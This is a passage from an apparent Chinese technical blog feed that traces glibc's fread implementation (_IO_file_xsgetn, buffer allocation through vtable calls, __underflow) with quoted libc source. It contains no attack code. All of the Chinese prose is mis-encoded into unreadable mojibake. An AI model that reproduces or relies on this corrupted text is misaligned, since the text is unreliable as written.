å‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°</h2><ul><li><code>_IO_fwrite</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_new_file_xsputn</code>ã€‚</li><li><code>_IO_new_file_xsputn</code>å‡½æ•°è°ƒç”¨äº†vtableä¸­çš„<code>_IO_new_file_overflow</code>å®ç°ç¼“å†²åŒºçš„å»ºç«‹ä»¥åŠåˆ·æ–°ç¼“å†²åŒºã€‚</li><li>vtableä¸­çš„<code>_IO_new_file_overflow</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_doallocate</code>ä»¥åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºã€‚</li><li>vtableä¸­çš„<code>_IO_file_doallocate</code>è°ƒç”¨äº†vtableä¸­çš„<code>__GI__IO_file_stat</code>ä»¥è·å–æ–‡ä»¶ä¿¡æ¯ã€‚</li><li><code>new_do_write</code>ä¸­çš„<code>_IO_SYSWRITE</code>è°ƒç”¨äº†vtable<code>_IO_new_file_write</code>æœ€ç»ˆå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨writeã€‚</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO FILE fread</title>
      <link href="/2023/03/31/IO-FILE-fread/"/>
      <url>/2023/03/31/IO-FILE-fread/</url>
      
        <content type="html"><![CDATA[<h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>é¦–å…ˆæ„Ÿè°¢ä¸€ä¸‹ray-cpå¸ˆå‚…çš„æ–‡ç«  <a href="https://www.anquanke.com/post/id/177958#h2-5">https://www.anquanke.com/post/id/177958#h2-5</a></p><p>æµ‹è¯•ç¨‹åº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">20</span>];</span><br><span class="line">    FILE*fp=fopen(<span class="string">&quot;./text&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(data,<span class="number">1</span>,<span class="number">20</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span> <span class="params">( <span class="type">void</span> *buffer, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *stream)</span> ;</span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;iofread.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">weak_alias(_IO_fread , fread);</span><br></pre></td></tr></table></figure><p><strong>_IO_fread</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_size_t bytes_requested = size * count;</span><br><span class="line">  _IO_size_t bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_fread)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆCHECK_FILEæ£€æµ‹fpåˆæ³•æ€§</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> IO_DEBUG</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> ((FILE) == NULL) &#123; MAYBE_SET_EINVAL; return RET; &#125; \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123; COERCE_FILE(FILE); \</span></span><br><span class="line"><span class="meta">           <span class="keyword">if</span> (((FILE)-&gt;_IO_file_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC) \</span></span><br><span class="line"><span class="meta">      &#123; MAYBE_SET_EINVAL; return RET; &#125;&#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> CHECK_FILE(FILE, RET) COERCE_FILE (FILE)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>å¦‚æœå®šä¹‰äº†IO_DEBUG</p><p>FILEä¸ºç©ºç›´æ¥è¿”å›ï¼Œå¦åˆ™æ£€æµ‹FILEçš„flagé­”æ•°æ˜¯å¦åŒ¹é…</p><p>å›åˆ°_IO_freadè¿›è¡ŒåŠ é”åè°ƒç”¨_IO_sgetn</p><p><strong>libio&#x2F;genops.c</strong></p><p>_IO_sgetn</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_sgetn (_IO_FILE *fp, <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>libio&#x2F;libioP.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) _IO_JUMPS_FILE_plus (THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">                       + offsetof(TYPE, MEMBER)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_MEMBER_TYPE(TYPE, MEMBER) __typeof__ (((TYPE)&#123;&#125;).MEMBER)</span></span><br></pre></td></tr></table></figure><p>ç›–äºšï¼Œfucking macro</p><blockquote><p><code>((struct _IO_FILE_plus)&#123;&#125;)</code> åˆ›å»ºäº†ä¸€ä¸ªåŒ¿åçš„ <code>_IO_FILE_plus</code> ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“é‡Œé¢åªæœ‰ä¸€ä¸ª <code>vtable</code> æˆå‘˜ï¼Œå…¶ä½™æˆå‘˜éƒ½æ˜¯é»˜è®¤å€¼ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">((*(__typeof__ (((<span class="keyword">struct</span> _IO_FILE_plus)&#123;&#125;).vtable) *)(((<span class="type">char</span> *) ((fp))) + offsetof(<span class="keyword">struct</span> _IO_FILE_plus, vtable)))-&gt;__xsgetn) (fp, data, n);</span><br></pre></td></tr></table></figure><p><mark><strong>æœ€ç»ˆè°ƒç”¨è™šè¡¨é‡Œçš„__xsgetnæŒ‡å‘çš„_IO_file_xsgetn</strong><mark></mark></mark></p><hr><p><strong>libio&#x2F;fileops.c</strong></p><p>_IO_file_xsgetn</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_file_xsgetn(_IO_FILE* fp, <span class="type">void</span>* data, _IO_size_t n) &#123;</span><br><span class="line">  _IO_size_t want, have;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line">  <span class="type">char</span>* s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">free</span>(fp-&gt;_IO_save_base);</span><br><span class="line">      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">    &#125;</span><br><span class="line">    _IO_doallocbuf(fp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">    <span class="keyword">if</span> (want &lt;= have) &#123;</span><br><span class="line">      <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">      fp-&gt;_IO_read_ptr += want;</span><br><span class="line">      want = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (have &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">        s = __mempcpy(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        <span class="built_in">memcpy</span>(s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">        s += have;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        want -= have;</span><br><span class="line">        fp-&gt;_IO_read_ptr += have;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_in_backup(fp)) &#123;</span><br><span class="line">        _IO_switch_to_main_get_area(fp);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">         the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">         the user buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">        &amp;&amp; want &lt; (<span class="type">size_t</span>)(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (__underflow(fp) == EOF)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">         waiting for input. */</span></span><br><span class="line">      _IO_setg(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">      _IO_setp(fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">      count = want;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_buf_base) &#123;</span><br><span class="line">        _IO_size_t block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">        <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">          count -= want % block_size;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      count = _IO_SYSREAD(fp, s, count);</span><br><span class="line">      <span class="keyword">if</span> (count &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">          fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      s += count;</span><br><span class="line">      want -= count;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">        _IO_pos_adjust(fp-&gt;_offset, count);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(_IO_file_xsgetn)</span><br></pre></td></tr></table></figure><h2 id="åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒº"><a href="#åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒº" class="headerlink" title="åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒº"></a>åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒº</h2><p>å…ˆæ£€æµ‹æ˜¯å¦æœ‰å¤‡ä»½çš„ç¼“å†²åŒºï¼Œæœ‰åˆ™å°†ç¼“å†²åŒºé‡Šæ”¾æ‰ï¼Œå¹¶æŠŠ_IO_IN_BACKUPä½ç½®ç©º<br>å½“ç¨‹åºéœ€è¦ä»ä¸€ä¸ªIOæµä¸­è¯»å–ä¸‹ä¸€ä¸ªå­—ç¬¦æ—¶ï¼Œå®ƒé€šå¸¸ä¼šä»ç¼“å†²åŒºä¸­è¯»å–ä¸€ä¸ªå­—ç¬¦ï¼Œå¦‚æœç¼“å†²åŒºä¸ºç©ºï¼Œåˆ™ä¼šè§¦å‘ä¸€ä¸ªIOæ“ä½œï¼Œå°†æ›´å¤šçš„æ•°æ®è¯»å…¥ç¼“å†²åŒºä¸­ã€‚ä½†æ˜¯åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç¨‹åºéœ€è¦è¯»å–ç¼“å†²åŒºä¸­çš„å¤‡ç”¨å­—ç¬¦ï¼Œè€Œä¸æ˜¯ä»IOæµä¸­è¯»å–ã€‚æ­¤æ—¶ï¼Œ_IO_IN_BACKUPæ ‡å¿—å°±ä¼šè¢«è®¾ç½®ï¼Œä»¥æŒ‡ç¤ºä¸‹ä¸€ä¸ªå­—ç¬¦æ˜¯å¤‡ç”¨å­—ç¬¦è€Œä¸æ˜¯IOæµä¸­çš„å­—ç¬¦ã€‚</p><p>ç„¶åè°ƒç”¨_IO_doallocbuf(buf)</p><p><strong>libio&#x2F;genops.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_doallocbuf (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_doallocbuf)</span><br></pre></td></tr></table></figure><p>æ£€æµ‹å€¼åè°ƒç”¨_IO_DOALLOCATE</p><p><strong>libio&#x2F;libioP.h</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  _IO_DOALLOCATE(FP)  JUMP0(__doallocate , FP)</span></span><br></pre></td></tr></table></figure><p><mark>æ ¹æ®å‰é¢çš„ç»éªŒè°ƒç”¨è™šè¡¨ä¸­çš„**__doallocate<strong>æŒ‡å‘çš„</strong>_IO_file_doallocate**å‡½æ•°<mark></mark></mark></p><p><strong>libio&#x2F;filedoalloc.c</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate(_IO_FILE* fp) &#123;</span><br><span class="line">  _IO_size_t size;</span><br><span class="line">  <span class="type">char</span>* p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _LIBC</span></span><br><span class="line">  <span class="comment">/* If _IO_cleanup_registration_needed is non-zero, we should call the</span></span><br><span class="line"><span class="comment">     function it points to.  This is to make sure _IO_cleanup gets called</span></span><br><span class="line"><span class="comment">     on exit.  We call it from _IO_file_doallocate, since that is likely</span></span><br><span class="line"><span class="comment">     to get called by any program that does buffered I/O. */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(_IO_cleanup_registration_needed != <span class="literal">NULL</span>))</span><br><span class="line">    (*_IO_cleanup_registration_needed) ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  size = _IO_BUFSIZ;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect(_IO_SYSSTAT(fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (S_ISCHR(st.st_mode)) &#123;</span><br><span class="line">      <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">      <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">        DEV_TTY_P(&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        local_isatty(fp-&gt;_fileno))</span><br><span class="line">        fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _IO_HAVE_ST_BLKSIZE</span></span><br><span class="line">    <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span>)</span><br><span class="line">      size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb(fp, p, p + size, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(_IO_file_doallocate)</span><br></pre></td></tr></table></figure><p>struct stat64æ˜¯ä¸€ä¸ªåœ¨UNIXå’ŒLinuxç³»ç»Ÿä¸­ç”¨äºå­˜å‚¨æ–‡ä»¶æˆ–ç›®å½•å…ƒæ•°æ®çš„æ•°æ®ç»“æ„ã€‚å®ƒçš„å®šä¹‰é€šå¸¸åœ¨å¤´æ–‡ä»¶&lt;sys&#x2F;stat.h&gt;ä¸­ï¼Œå¹¶åŒ…å«ä»¥ä¸‹æˆå‘˜ï¼š</p><ol><li>devï¼šæ–‡ä»¶æ‰€åœ¨è®¾å¤‡çš„è®¾å¤‡å·</li><li>inoï¼šæ–‡ä»¶çš„ièŠ‚ç‚¹å·</li><li>modeï¼šæ–‡ä»¶çš„è®¿é—®æƒé™å’Œç±»å‹ï¼ˆå¦‚æ™®é€šæ–‡ä»¶ã€ç›®å½•ã€ç¬¦å·é“¾æ¥ç­‰ï¼‰</li><li>nlinkï¼šæ–‡ä»¶çš„ç¡¬é“¾æ¥æ•°</li><li>uidï¼šæ–‡ä»¶æ‰€æœ‰è€…çš„ç”¨æˆ·ID</li><li>gidï¼šæ–‡ä»¶æ‰€æœ‰è€…æ‰€åœ¨çš„ç»„ID</li><li>rdevï¼šå¦‚æœæ–‡ä»¶æ˜¯è®¾å¤‡æ–‡ä»¶ï¼Œåˆ™ä¸ºè®¾å¤‡å·</li><li>sizeï¼šæ–‡ä»¶å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</li><li>blksizeï¼šæ–‡ä»¶ç³»ç»Ÿå—å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰</li><li>blocksï¼šæ–‡ä»¶å ç”¨çš„å—æ•°ï¼ˆä»¥æ–‡ä»¶ç³»ç»Ÿå—ä¸ºå•ä½ï¼‰</li><li>atimeï¼šæ–‡ä»¶ä¸Šä¸€æ¬¡è¢«è®¿é—®çš„æ—¶é—´</li><li>mtimeï¼šæ–‡ä»¶ä¸Šä¸€æ¬¡ä¿®æ”¹çš„æ—¶é—´</li><li>ctimeï¼šæ–‡ä»¶ä¸Šä¸€æ¬¡çŠ¶æ€æ”¹å˜çš„æ—¶é—´ï¼ˆå¦‚æ–‡ä»¶æ‰€æœ‰è€…æˆ–æƒé™çš„æ”¹å˜</li></ol><p><mark><strong>é¦–å…ˆæ˜¯_IO_SYSSTATè°ƒç”¨è™šè¡¨ä¸­çš„__statæŒ‡å‘çš„_IO_file_statå‡½æ•°</strong><mark></mark></mark></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_SYSSTAT(FP, BUF) JUMP1 (__stat, FP, BUF)</span></span><br></pre></td></tr></table></figure><p>ç³»ç»Ÿè°ƒç”¨SYS_fstatä¿®æ”¹<strong>st.blksize</strong>å¤§å°</p><p><img src="/2023/03/31/IO-FILE-fread/image-20230331170443379.png" alt="image-20230331170443379"></p><p>ç„¶åç”³è¯·äº†ä¸€å—å†…å­˜ï¼Œè°ƒç”¨<strong>libio&#x2F;genops.c</strong>ä¸­çš„**_IO_setb**</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb(_IO_FILE* f, <span class="type">char</span>* b, <span class="type">char</span>* eb, <span class="type">int</span> a) &#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span>(f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def(_IO_setb)</span><br></pre></td></tr></table></figure><p>å¦‚æœfçš„_IO_buf_baseå­˜åœ¨ï¼Œè€Œä¸”æ ‡å¿—ä½çš„_IO_USER_BUFä¸æ˜¯ç”¨æˆ·åˆ†é…ç¼“å†²åŒºï¼Œé‡Šæ”¾è¿™ä¸ªç¼“å†²åŒº</p><p>è®¾ç½®_IO_buf_baseä¸ºåˆšåˆšmallocçš„å †ä¸ºç¼“å†²åŒºï¼Œ_IO_buf_endè®¾ç½®ä¸ºå †å—å¼€å§‹+å †å—å¤§å°ï¼Œå¹¶è®¾ç½®_flagsä¸ºç”¨æˆ·åˆ†é…ç¼“å†²åŒº</p><blockquote><p>#define _IO_USER_BUF 1 &#x2F;* User owns buffer; donâ€™t delete it on close. *&#x2F;</p><p>_IO_USER_BUFç”¨äºæŒ‡ç¤ºæ–‡ä»¶æµçš„ç¼“å†²åŒºæ˜¯ç”±ç”¨æˆ·åˆ†é…çš„è¿˜æ˜¯ç”±æ ‡å‡† I&#x2F;O åº“åˆ†é…çš„ã€‚å¦‚æœ <code>_IO_USER_BUF</code> æ ‡å¿—ä½æœªè¢«è®¾ç½®ï¼Œé‚£ä¹ˆè¡¨ç¤ºæ–‡ä»¶æµçš„ç¼“å†²åŒºæ˜¯ç”±æ ‡å‡† I&#x2F;O åº“åˆ†é…çš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ ‡å‡† I&#x2F;O åº“ä¼šåœ¨å…³é—­æ–‡ä»¶æµæ—¶è‡ªåŠ¨é‡Šæ”¾ç¼“å†²åŒºã€‚å¦‚æœ <code>_IO_USER_BUF</code> æ ‡å¿—ä½è¢«è®¾ç½®ï¼Œé‚£ä¹ˆè¡¨ç¤ºæ–‡ä»¶æµçš„ç¼“å†²åŒºæ˜¯ç”±ç”¨æˆ·åˆ†é…çš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ ‡å‡† I&#x2F;O åº“ä¸ä¼šå°è¯•é‡Šæ”¾ç¼“å†²åŒº </p></blockquote><hr><h2 id="å¾€ç¼“å†²åŒºé‡Œå†™å…¥æµæŒ‡é’ˆæ‰€æ ‡è®°çš„æ–‡ä»¶æ•°æ®ï¼Œå¹¶æŠŠæ•°æ®å†™å…¥ç›®æ ‡å†…å­˜"><a href="#å¾€ç¼“å†²åŒºé‡Œå†™å…¥æµæŒ‡é’ˆæ‰€æ ‡è®°çš„æ–‡ä»¶æ•°æ®ï¼Œå¹¶æŠŠæ•°æ®å†™å…¥ç›®æ ‡å†…å­˜" class="headerlink" title="å¾€ç¼“å†²åŒºé‡Œå†™å…¥æµæŒ‡é’ˆæ‰€æ ‡è®°çš„æ–‡ä»¶æ•°æ®ï¼Œå¹¶æŠŠæ•°æ®å†™å…¥ç›®æ ‡å†…å­˜"></a>å¾€ç¼“å†²åŒºé‡Œå†™å…¥æµæŒ‡é’ˆæ‰€æ ‡è®°çš„æ–‡ä»¶æ•°æ®ï¼Œå¹¶æŠŠæ•°æ®å†™å…¥ç›®æ ‡å†…å­˜</h2><p>å›åˆ°_IO_file_xsgetnç„¶åè¿›è¡Œæˆ‘ä»¬freadå‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°countæ¬¡çš„å¾ªç¯</p><p>å‰é¢æ¡ä»¶éƒ½ä¸ç¬¦åˆæ¥åˆ°<code> if (fp-&gt;_IO_buf_base&amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</code></p><h4 id="want-lt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-base-æ—¶-å³freadä¸€æ¬¡æƒ³è¦è¯»å–çš„æ•°æ®å°äº4k"><a href="#want-lt-size-t-fp-gt-IO-buf-end-fp-gt-IO-buf-base-æ—¶-å³freadä¸€æ¬¡æƒ³è¦è¯»å–çš„æ•°æ®å°äº4k" class="headerlink" title="want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)æ—¶,å³freadä¸€æ¬¡æƒ³è¦è¯»å–çš„æ•°æ®å°äº4k"></a><strong>want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)æ—¶,å³freadä¸€æ¬¡æƒ³è¦è¯»å–çš„æ•°æ®å°äº4k</strong></h4><p>è°ƒç”¨<strong>libio&#x2F;genops.c</strong> __underflow</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> 